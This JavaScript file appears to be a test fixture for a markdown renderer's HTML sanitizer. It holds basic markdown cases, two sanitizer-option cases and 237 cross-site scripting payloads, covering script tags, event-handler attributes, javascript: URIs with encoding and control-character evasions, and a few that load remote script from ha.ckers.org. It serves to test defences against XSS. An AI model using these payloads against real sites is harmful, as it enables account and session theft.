import without from 'lodash/without'
import { defaultSanitizerOptions } from './index'

const customSanitizerOptions = (options) =>
  Object.assign({}, defaultSanitizerOptions, options)

export default [
  {
    name: 'should render markdown h1 headers',
    source: '# Foobar'
  },
  {
    name: 'should render markdown h2 headers',
    source: '## Foobar'
  },
  {
    name: 'should render markdown h3 headers',
    source: '### Foobar'
  },
  {
    name: 'should render markdown h4 headers',
    source: '#### Foobar'
  },
  {
    name: 'should render markdown h4 headers',
    source: '#### Foobar'
  },
  {
    name: 'should render markdown h5 headers',
    source: '##### Foobar'
  },
  {
    name: 'should render markdown h5 headers',
    source: '###### Foobar'
  },
  {
    name: 'should render markdown italics using *',
    source: '*Foobar*'
  },
  {
    name: 'should render markdown italics using _',
    source: '_Foobar_'
  },
  {
    name: 'should render markdown bold using **',
    source: '**Foobar**'
  },
  {
    name: 'should render markdown bold using __',
    source: '__Foobar__'
  },
  {
    name: 'should render markdown unordered lists',
    source: '* Item 1\n* Item 2\n  * Item 2a\n  * Item 2b'
  },
  {
    name: 'should render markdown ordered lists',
    source: '1. Item 1\n1. Item 2\n  1. Item 2a\n  1. Item 2b'
  },
  {
    name: 'should render markdown images',
    source:
      '![GitHub logo](https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png)'
  },
  {
    name: 'should render markdown links',
    source: '[GitHub](https://github.com)'
  },
  {
    name: 'should render link type strings as links',
    source: 'https://github.com'
  },
  {
    name: 'should render markdown blockquotes',
    source: '> Lorem ipsum dolor sit amet'
  },
  {
    name: 'should render markdown inline code',
    source: '`Lorem ipsum dolor sit amet`'
  },
  {
    name: 'should render markdown code blocks',
    source: "```\nconst foo = () => {\n  return 'bar'\n}\n```"
  },
  {
    name: 'should render markdown code blocks with language specified',
    source: "```javascript\nconst foo = () => {\n  return 'bar'\n}\n```"
  },
  {
    name: 'should render markdown task lists',
    source: '- [x] task 1\n- [x] task 2\n- [ ] task 3'
  },
  {
    name: 'should render markdown tables',
    source: 'First | Second\n------------ | -------------\n1 | 2\n3 | 4'
  },
  {
    name: 'should render markdown strikethroughs',
    source: '~~foobar~~'
  },
  {
    name: 'should render html images',
    source:
      '<img src="https://github.githubassets.com/images/modules/logos_page/GitHub-Mark.png" />'
  },
  {
    name: 'should render html links',
    source: '<a href="https://github.com">GitHub</a>'
  },
  {
    name: 'should drop the content of style elements tag',
    source: '<style>.foo { color: blue; }</style>'
  },
  {
    name: 'should drop the content of textarea elements tag',
    source: '<textarea>foobar</textarea>'
  },
  {
    name: 'xss: 1',
    source: '<script>alert(123)</script>'
  },
  {
    name: 'xss: 2',
    source: '&lt;script&gt;alert(&#39;123&#39;);&lt;/script&gt;'
  },
  {
    name: 'xss: 3',
    source: '<img src=x onerror=alert(123) />'
  },
  {
    name: 'xss: 4',
    source: '<svg><script>123<1>alert(123)</script>'
  },
  {
    name: 'xss: 5',
    source: '"><script>alert(123)</script>'
  },
  {
    name: 'xss: 6',
    source: '"><script>alert(123)</script>'
  },
  {
    name: 'xss: 7',
    source: "'><script>alert(123)</script>"
  },
  {
    name: 'xss: 8',
    source: '><script>alert(123)</script>'
  },
  {
    name: 'xss: 9',
    source: '</script><script>alert(123)</script>'
  },
  {
    name: 'xss: 10',
    source: '< / script >< script >alert(123)< / script >'
  },
  {
    name: 'xss: 11',
    source: ' onfocus=JaVaSCript:alert(123) autofocus'
  },
  {
    name: 'xss: 12',
    source: '" onfocus=JaVaSCript:alert(123) autofocus'
  },
  {
    name: 'xss: 13',
    source: "' onfocus=JaVaSCript:alert(123) autofocus"
  },
  {
    name: 'xss: 14',
    source: '＜script＞alert(123)＜/script＞'
  },
  {
    name: 'xss: 15',
    source: '<sc<script>ript>alert(123)</sc</script>ript>'
  },
  {
    name: 'xss: 16',
    source: '--><script>alert(123)</script>'
  },
  {
    name: 'xss: 17',
    source: '";alert(123);t="'
  },
  {
    name: 'xss: 18',
    source: "';alert(123);t='"
  },
  {
    name: 'xss: 19',
    source: 'JavaSCript:alert(123)'
  },
  {
    name: 'xss: 20',
    source: ';alert(123);'
  },
  {
    name: 'xss: 21',
    source: 'src=JaVaSCript:prompt(132)'
  },
  {
    name: 'xss: 22',
    source: '"><script>alert(123);</script x="'
  },
  {
    name: 'xss: 23',
    source: "'><script>alert(123);</script x='"
  },
  {
    name: 'xss: 24',
    source: '><script>alert(123);</script x='
  },
  {
    name: 'xss: 25',
    source: '" autofocus onkeyup="javascript:alert(123)'
  },
  {
    name: 'xss: 26',
    source: "' autofocus onkeyup='javascript:alert(123)"
  },
  {
    name: 'xss: 27',
    source: '<script\\x20type="text/javascript">javascript:alert(1);</script>'
  },
  {
    name: 'xss: 28',
    source: '<script\\x3Etype="text/javascript">javascript:alert(1);</script>'
  },
  {
    name: 'xss: 29',
    source: '<script\\x0Dtype="text/javascript">javascript:alert(1);</script>'
  },
  {
    name: 'xss: 30',
    source: '<script\\x09type="text/javascript">javascript:alert(1);</script>'
  },
  {
    name: 'xss: 31',
    source: '<script\\x0Ctype="text/javascript">javascript:alert(1);</script>'
  },
  {
    name: 'xss: 32',
    source: '<script\\x2Ftype="text/javascript">javascript:alert(1);</script>'
  },
  {
    name: 'xss: 33',
    source: '<script\\x0Atype="text/javascript">javascript:alert(1);</script>'
  },
  {
    name: 'xss: 34',
    source: '\'`"><\\x3Cscript>javascript:alert(1)</script>'
  },
  {
    name: 'xss: 35',
    source: '\'`"><\\x00script>javascript:alert(1)</script>'
  },
  {
    name: 'xss: 36',
    source: 'ABC<div style="x\\x3Aexpression(javascript:alert(1)">DEF'
  },
  {
    name: 'xss: 37',
    source: 'ABC<div style="x:expression\\x5C(javascript:alert(1)">DEF'
  },
  {
    name: 'xss: 38',
    source: 'ABC<div style="x:expression\\x00(javascript:alert(1)">DEF'
  },
  {
    name: 'xss: 39',
    source: 'ABC<div style="x:exp\\x00ression(javascript:alert(1)">DEF'
  },
  {
    name: 'xss: 40',
    source: 'ABC<div style="x:exp\\x5Cression(javascript:alert(1)">DEF'
  },
  {
    name: 'xss: 41',
    source: 'ABC<div style="x:\\x0Aexpression(javascript:alert(1)">DEF'
  },
  {
    name: 'xss: 42',
    source: 'ABC<div style="x:\\x09expression(javascript:alert(1)">DEF'
  },
  {
    name: 'xss: 43',
    source:
      'ABC<div style="x:\\xE3\\x80\\x80expression(javascript:alert(1)">DEF'
  },
  {
    name: 'xss: 44',
    source:
      'ABC<div style="x:\\xE2\\x80\\x84expression(javascript:alert(1)">DEF'
  },
  {
    name: 'xss: 45',
    source: 'ABC<div style="x:\\xC2\\xA0expression(javascript:alert(1)">DEF'
  },
  {
    name: 'xss: 46',
    source:
      'ABC<div style="x:\\xE2\\x80\\x80expression(javascript:alert(1)">DEF'
  },
  {
    name: 'xss: 47',
    source:
      'ABC<div style="x:\\xE2\\x80\\x8Aexpression(javascript:alert(1)">DEF'
  },
  {
    name: 'xss: 48',
    source: 'ABC<div style="x:\\x0Dexpression(javascript:alert(1)">DEF'
  },
  {
    name: 'xss: 49',
    source: 'ABC<div style="x:\\x0Cexpression(javascript:alert(1)">DEF'
  },
  {
    name: 'xss: 50',
    source:
      'ABC<div style="x:\\xE2\\x80\\x87expression(javascript:alert(1)">DEF'
  },
  {
    name: 'xss: 51',
    source:
      'ABC<div style="x:\\xEF\\xBB\\xBFexpression(javascript:alert(1)">DEF'
  },
  {
    name: 'xss: 52',
    source: 'ABC<div style="x:\\x20expression(javascript:alert(1)">DEF'
  },
  {
    name: 'xss: 53',
    source:
      'ABC<div style="x:\\xE2\\x80\\x88expression(javascript:alert(1)">DEF'
  },
  {
    name: 'xss: 54',
    source: 'ABC<div style="x:\\x00expression(javascript:alert(1)">DEF'
  },
  {
    name: 'xss: 55',
    source:
      'ABC<div style="x:\\xE2\\x80\\x8Bexpression(javascript:alert(1)">DEF'
  },
  {
    name: 'xss: 56',
    source:
      'ABC<div style="x:\\xE2\\x80\\x86expression(javascript:alert(1)">DEF'
  },
  {
    name: 'xss: 57',
    source:
      'ABC<div style="x:\\xE2\\x80\\x85expression(javascript:alert(1)">DEF'
  },
  {
    name: 'xss: 58',
    source:
      'ABC<div style="x:\\xE2\\x80\\x82expression(javascript:alert(1)">DEF'
  },
  {
    name: 'xss: 59',
    source: 'ABC<div style="x:\\x0Bexpression(javascript:alert(1)">DEF'
  },
  {
    name: 'xss: 60',
    source:
      'ABC<div style="x:\\xE2\\x80\\x81expression(javascript:alert(1)">DEF'
  },
  {
    name: 'xss: 61',
    source:
      'ABC<div style="x:\\xE2\\x80\\x83expression(javascript:alert(1)">DEF'
  },
  {
    name: 'xss: 62',
    source:
      'ABC<div style="x:\\xE2\\x80\\x89expression(javascript:alert(1)">DEF'
  },
  {
    name: 'xss: 63',
    source:
      '<a href="\\x0Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 64',
    source:
      '<a href="\\x0Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 65',
    source:
      '<a href="\\xC2\\xA0javascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 66',
    source:
      '<a href="\\x05javascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 67',
    source:
      '<a href="\\xE1\\xA0\\x8Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 68',
    source:
      '<a href="\\x18javascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 69',
    source:
      '<a href="\\x11javascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 70',
    source:
      '<a href="\\xE2\\x80\\x88javascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 71',
    source:
      '<a href="\\xE2\\x80\\x89javascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 72',
    source:
      '<a href="\\xE2\\x80\\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 73',
    source:
      '<a href="\\x17javascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 74',
    source:
      '<a href="\\x03javascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 75',
    source:
      '<a href="\\x0Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 76',
    source:
      '<a href="\\x1Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 77',
    source:
      '<a href="\\x00javascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 78',
    source:
      '<a href="\\x10javascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 79',
    source:
      '<a href="\\xE2\\x80\\x82javascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 80',
    source:
      '<a href="\\x20javascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 81',
    source:
      '<a href="\\x13javascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 82',
    source:
      '<a href="\\x09javascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 83',
    source:
      '<a href="\\xE2\\x80\\x8Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 84',
    source:
      '<a href="\\x14javascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 85',
    source:
      '<a href="\\x19javascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 86',
    source:
      '<a href="\\xE2\\x80\\xAFjavascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 87',
    source:
      '<a href="\\x1Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 88',
    source:
      '<a href="\\xE2\\x80\\x81javascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 89',
    source:
      '<a href="\\x1Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 90',
    source:
      '<a href="\\xE2\\x80\\x87javascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 91',
    source:
      '<a href="\\x07javascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 92',
    source:
      '<a href="\\xE1\\x9A\\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 93',
    source:
      '<a href="\\xE2\\x80\\x83javascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 94',
    source:
      '<a href="\\x04javascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 95',
    source:
      '<a href="\\x01javascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 96',
    source:
      '<a href="\\x08javascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 97',
    source:
      '<a href="\\xE2\\x80\\x84javascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 98',
    source:
      '<a href="\\xE2\\x80\\x86javascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 99',
    source:
      '<a href="\\xE3\\x80\\x80javascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 100',
    source:
      '<a href="\\x12javascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 101',
    source:
      '<a href="\\x0Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 102',
    source:
      '<a href="\\x0Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 103',
    source:
      '<a href="\\x0Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 104',
    source:
      '<a href="\\x15javascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 105',
    source:
      '<a href="\\xE2\\x80\\xA8javascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 106',
    source:
      '<a href="\\x16javascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 107',
    source:
      '<a href="\\x02javascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 108',
    source:
      '<a href="\\x1Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 109',
    source:
      '<a href="\\x06javascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 110',
    source:
      '<a href="\\xE2\\x80\\xA9javascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 111',
    source:
      '<a href="\\xE2\\x80\\x85javascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 112',
    source:
      '<a href="\\x1Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 113',
    source:
      '<a href="\\xE2\\x81\\x9Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 114',
    source:
      '<a href="\\x1Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 115',
    source:
      '<a href="javascript\\x00:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 116',
    source:
      '<a href="javascript\\x3A:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 117',
    source:
      '<a href="javascript\\x09:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 118',
    source:
      '<a href="javascript\\x0D:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 119',
    source:
      '<a href="javascript\\x0A:javascript:alert(1)" id="fuzzelement1">test</a>'
  },
  {
    name: 'xss: 120',
    source: '`"\'><img src=xxx:x \\x0Aonerror=javascript:alert(1)>'
  },
  {
    name: 'xss: 121',
    source: '`"\'><img src=xxx:x \\x22onerror=javascript:alert(1)>'
  },
  {
    name: 'xss: 122',
    source: '`"\'><img src=xxx:x \\x0Bonerror=javascript:alert(1)>'
  },
  {
    name: 'xss: 123',
    source: '`"\'><img src=xxx:x \\x0Donerror=javascript:alert(1)>'
  },
  {
    name: 'xss: 124',
    source: '`"\'><img src=xxx:x \\x2Fonerror=javascript:alert(1)>'
  },
  {
    name: 'xss: 125',
    source: '`"\'><img src=xxx:x \\x09onerror=javascript:alert(1)>'
  },
  {
    name: 'xss: 126',
    source: '`"\'><img src=xxx:x \\x0Conerror=javascript:alert(1)>'
  },
  {
    name: 'xss: 127',
    source: '`"\'><img src=xxx:x \\x00onerror=javascript:alert(1)>'
  },
  {
    name: 'xss: 128',
    source: '`"\'><img src=xxx:x \\x27onerror=javascript:alert(1)>'
  },
  {
    name: 'xss: 129',
    source: '`"\'><img src=xxx:x \\x20onerror=javascript:alert(1)>'
  },
  {
    name: 'xss: 130',
    source: '"`\'><script>\\x3Bjavascript:alert(1)</script>'
  },
  {
    name: 'xss: 131',
    source: '"`\'><script>\\x0Djavascript:alert(1)</script>'
  },
  {
    name: 'xss: 132',
    source: '"`\'><script>\\xEF\\xBB\\xBFjavascript:alert(1)</script>'
  },
  {
    name: 'xss: 133',
    source: '"`\'><script>\\xE2\\x80\\x81javascript:alert(1)</script>'
  },
  {
    name: 'xss: 134',
    source: '"`\'><script>\\xE2\\x80\\x84javascript:alert(1)</script>'
  },
  {
    name: 'xss: 135',
    source: '"`\'><script>\\xE3\\x80\\x80javascript:alert(1)</script>'
  },
  {
    name: 'xss: 136',
    source: '"`\'><script>\\x09javascript:alert(1)</script>'
  },
  {
    name: 'xss: 137',
    source: '"`\'><script>\\xE2\\x80\\x89javascript:alert(1)</script>'
  },
  {
    name: 'xss: 138',
    source: '"`\'><script>\\xE2\\x80\\x85javascript:alert(1)</script>'
  },
  {
    name: 'xss: 139',
    source: '"`\'><script>\\xE2\\x80\\x88javascript:alert(1)</script>'
  },
  {
    name: 'xss: 140',
    source: '"`\'><script>\\x00javascript:alert(1)</script>'
  },
  {
    name: 'xss: 141',
    source: '"`\'><script>\\xE2\\x80\\xA8javascript:alert(1)</script>'
  },
  {
    name: 'xss: 142',
    source: '"`\'><script>\\xE2\\x80\\x8Ajavascript:alert(1)</script>'
  },
  {
    name: 'xss: 143',
    source: '"`\'><script>\\xE1\\x9A\\x80javascript:alert(1)</script>'
  },
  {
    name: 'xss: 144',
    source: '"`\'><script>\\x0Cjavascript:alert(1)</script>'
  },
  {
    name: 'xss: 145',
    source: '"`\'><script>\\x2Bjavascript:alert(1)</script>'
  },
  {
    name: 'xss: 146',
    source: '"`\'><script>\\xF0\\x90\\x96\\x9Ajavascript:alert(1)</script>'
  },
  {
    name: 'xss: 147',
    source: '"`\'><script>-javascript:alert(1)</script>'
  },
  {
    name: 'xss: 148',
    source: '"`\'><script>\\x0Ajavascript:alert(1)</script>'
  },
  {
    name: 'xss: 149',
    source: '"`\'><script>\\xE2\\x80\\xAFjavascript:alert(1)</script>'
  },
  {
    name: 'xss: 150',
    source: '"`\'><script>\\x7Ejavascript:alert(1)</script>'
  },
  {
    name: 'xss: 151',
    source: '"`\'><script>\\xE2\\x80\\x87javascript:alert(1)</script>'
  },
  {
    name: 'xss: 152',
    source: '"`\'><script>\\xE2\\x81\\x9Fjavascript:alert(1)</script>'
  },
  {
    name: 'xss: 153',
    source: '"`\'><script>\\xE2\\x80\\xA9javascript:alert(1)</script>'
  },
  {
    name: 'xss: 154',
    source: '"`\'><script>\\xC2\\x85javascript:alert(1)</script>'
  },
  {
    name: 'xss: 155',
    source: '"`\'><script>\\xEF\\xBF\\xAEjavascript:alert(1)</script>'
  },
  {
    name: 'xss: 156',
    source: '"`\'><script>\\xE2\\x80\\x83javascript:alert(1)</script>'
  },
  {
    name: 'xss: 157',
    source: '"`\'><script>\\xE2\\x80\\x8Bjavascript:alert(1)</script>'
  },
  {
    name: 'xss: 158',
    source: '"`\'><script>\\xEF\\xBF\\xBEjavascript:alert(1)</script>'
  },
  {
    name: 'xss: 159',
    source: '"`\'><script>\\xE2\\x80\\x80javascript:alert(1)</script>'
  },
  {
    name: 'xss: 160',
    source: '"`\'><script>\\x21javascript:alert(1)</script>'
  },
  {
    name: 'xss: 161',
    source: '"`\'><script>\\xE2\\x80\\x82javascript:alert(1)</script>'
  },
  {
    name: 'xss: 162',
    source: '"`\'><script>\\xE2\\x80\\x86javascript:alert(1)</script>'
  },
  {
    name: 'xss: 163',
    source: '"`\'><script>\\xE1\\xA0\\x8Ejavascript:alert(1)</script>'
  },
  {
    name: 'xss: 164',
    source: '"`\'><script>\\x0Bjavascript:alert(1)</script>'
  },
  {
    name: 'xss: 165',
    source: '"`\'><script>\\x20javascript:alert(1)</script>'
  },
  {
    name: 'xss: 166',
    source: '"`\'><script>\\xC2\\xA0javascript:alert(1)</script>'
  },
  {
    name: 'xss: 167',
    source: '<img \\x00src=x onerror="alert(1)">'
  },
  {
    name: 'xss: 168',
    source: '<img \\x47src=x onerror="javascript:alert(1)">'
  },
  {
    name: 'xss: 169',
    source: '<img \\x11src=x onerror="javascript:alert(1)">'
  },
  {
    name: 'xss: 170',
    source: '<img \\x12src=x onerror="javascript:alert(1)">'
  },
  {
    name: 'xss: 171',
    source: '<img\\x47src=x onerror="javascript:alert(1)">'
  },
  {
    name: 'xss: 172',
    source: '<img\\x10src=x onerror="javascript:alert(1)">'
  },
  {
    name: 'xss: 173',
    source: '<img\\x13src=x onerror="javascript:alert(1)">'
  },
  {
    name: 'xss: 174',
    source: '<img\\x32src=x onerror="javascript:alert(1)">'
  },
  {
    name: 'xss: 175',
    source: '<img\\x47src=x onerror="javascript:alert(1)">'
  },
  {
    name: 'xss: 176',
    source: '<img\\x11src=x onerror="javascript:alert(1)">'
  },
  {
    name: 'xss: 177',
    source: '<img \\x47src=x onerror="javascript:alert(1)">'
  },
  {
    name: 'xss: 178',
    source: '<img \\x34src=x onerror="javascript:alert(1)">'
  },
  {
    name: 'xss: 179',
    source: '<img \\x39src=x onerror="javascript:alert(1)">'
  },
  {
    name: 'xss: 180',
    source: '<img \\x00src=x onerror="javascript:alert(1)">'
  },
  {
    name: 'xss: 181',
    source: '<img src\\x09=x onerror="javascript:alert(1)">'
  },
  {
    name: 'xss: 182',
    source: '<img src\\x10=x onerror="javascript:alert(1)">'
  },
  {
    name: 'xss: 183',
    source: '<img src\\x13=x onerror="javascript:alert(1)">'
  },
  {
    name: 'xss: 184',
    source: '<img src\\x32=x onerror="javascript:alert(1)">'
  },
  {
    name: 'xss: 185',
    source: '<img src\\x12=x onerror="javascript:alert(1)">'
  },
  {
    name: 'xss: 186',
    source: '<img src\\x11=x onerror="javascript:alert(1)">'
  },
  {
    name: 'xss: 187',
    source: '<img src\\x00=x onerror="javascript:alert(1)">'
  },
  {
    name: 'xss: 188',
    source: '<img src\\x47=x onerror="javascript:alert(1)">'
  },
  {
    name: 'xss: 189',
    source: '<img src=x\\x09onerror="javascript:alert(1)">'
  },
  {
    name: 'xss: 190',
    source: '<img src=x\\x10onerror="javascript:alert(1)">'
  },
  {
    name: 'xss: 191',
    source: '<img src=x\\x11onerror="javascript:alert(1)">'
  },
  {
    name: 'xss: 192',
    source: '<img src=x\\x12onerror="javascript:alert(1)">'
  },
  {
    name: 'xss: 193',
    source: '<img src=x\\x13onerror="javascript:alert(1)">'
  },
  {
    name: 'xss: 194',
    source: '<img[a][b][c]src[d]=x[e]onerror=[f]"alert(1)">'
  },
  {
    name: 'xss: 195',
    source: '<img src=x onerror=\\x09"javascript:alert(1)">'
  },
  {
    name: 'xss: 196',
    source: '<img src=x onerror=\\x10"javascript:alert(1)">'
  },
  {
    name: 'xss: 197',
    source: '<img src=x onerror=\\x11"javascript:alert(1)">'
  },
  {
    name: 'xss: 198',
    source: '<img src=x onerror=\\x12"javascript:alert(1)">'
  },
  {
    name: 'xss: 199',
    source: '<img src=x onerror=\\x32"javascript:alert(1)">'
  },
  {
    name: 'xss: 200',
    source: '<img src=x onerror=\\x00"javascript:alert(1)">'
  },
  {
    name: 'xss: 201',
    source:
      '<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>'
  },
  {
    name: 'xss: 202',
    source: '<img src="x` `<script>javascript:alert(1)</script>"` `>'
  },
  {
    name: 'xss: 203',
    source: '<img src onerror /" \'"= alt=javascript:alert(1)//">'
  },
  {
    name: 'xss: 204',
    source:
      '<title onpropertychange=javascript:alert(1)></title><title title=>'
  },
  {
    name: 'xss: 205',
    source:
      '<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:alert(1)></a>">'
  },
  {
    name: 'xss: 206',
    source: '<!--[if]><script>javascript:alert(1)</script -->'
  },
  {
    name: 'xss: 207',
    source: '<!--[if<img src=x onerror=javascript:alert(1)//]> -->'
  },
  {
    name: 'xss: 208',
    source: '<script src="/\\%(jscript)s"></script>'
  },
  {
    name: 'xss: 209',
    source: '<script src="\\\\%(jscript)s"></script>'
  },
  {
    name: 'xss: 210',
    source: '<IMG """><SCRIPT>alert("XSS")</SCRIPT>">'
  },
  {
    name: 'xss: 211',
    source: '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>'
  },
  {
    name: 'xss: 212',
    source: '<IMG SRC=# onmouseover="alert(\'xxs\')">'
  },
  {
    name: 'xss: 213',
    source: '<IMG SRC= onmouseover="alert(\'xxs\')">'
  },
  {
    name: 'xss: 214',
    source: '<IMG onmouseover="alert(\'xxs\')">'
  },
  {
    name: 'xss: 215',
    source:
      '<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>'
  },
  {
    name: 'xss: 216',
    source:
      '<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>'
  },
  {
    name: 'xss: 217',
    source:
      '<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>'
  },
  {
    name: 'xss: 218',
    source: '<IMG SRC="jav   ascript:alert(\'XSS\');">'
  },
  {
    name: 'xss: 219',
    source: '<IMG SRC="jav&#x09;ascript:alert(\'XSS\');">'
  },
  {
    name: 'xss: 220',
    source: '<IMG SRC="jav&#x0A;ascript:alert(\'XSS\');">'
  },
  {
    name: 'xss: 221',
    source: '<IMG SRC="jav&#x0D;ascript:alert(\'XSS\');">'
  },
  {
    name: 'xss: 222',
    source:
      'perl -e \'print "<IMG SRC=java\\0script:alert(\\"XSS\\")>";\' > out'
  },
  {
    name: 'xss: 223',
    source: '<IMG SRC=" &#14;  javascript:alert(\'XSS\');">'
  },
  {
    name: 'xss: 224',
    source: '<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>'
  },
  {
    name: 'xss: 225',
    source: '<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert("XSS")>'
  },
  {
    name: 'xss: 226',
    source: '<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>'
  },
  {
    name: 'xss: 227',
    source: '<<SCRIPT>alert("XSS");//<</SCRIPT>'
  },
  {
    name: 'xss: 228',
    source: '<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >'
  },
  {
    name: 'xss: 229',
    source: '<SCRIPT SRC=//ha.ckers.org/.j>'
  },
  {
    name: 'xss: 230',
    source: '<IMG SRC="javascript:alert(\'XSS\')"'
  },
  {
    name: 'xss: 231',
    source: '<iframe src=http://ha.ckers.org/scriptlet.html <'
  },
  {
    name: 'xss: 232',
    source: "\\\";alert('XSS');//"
  },
  {
    name: 'xss: 233',
    source: '<u oncopy=alert()> Copy me</u>'
  },
  {
    name: 'xss: 234',
    source: '<i onwheel=alert(1)> Scroll over me </i>'
  },
  {
    name: 'xss: 235',
    source: '<plaintext>'
  },
  {
    name: 'xss: 236',
    source: 'http://a/%%30%30'
  },
  {
    name: 'xss: 237',
    source: '</textarea><script>alert(123)</script>'
  },
  {
    name: 'Custom sanitizer options: allowedTags can be overridden',
    sanitizerOptions: customSanitizerOptions({
      tagNames: without(defaultSanitizerOptions.tagNames, 'h1')
    }),
    source: '# Foobar\nSome text'
  },
  {
    name: 'Custom sanitizer options: allowedAttributes can be overridden',
    sanitizerOptions: customSanitizerOptions({
      tagNames: defaultSanitizerOptions.tagNames,
      attributes: {
        '*': [],
        input: ['disabled']
      }
    }),
    source: '<input disabled checked>'
  }
]
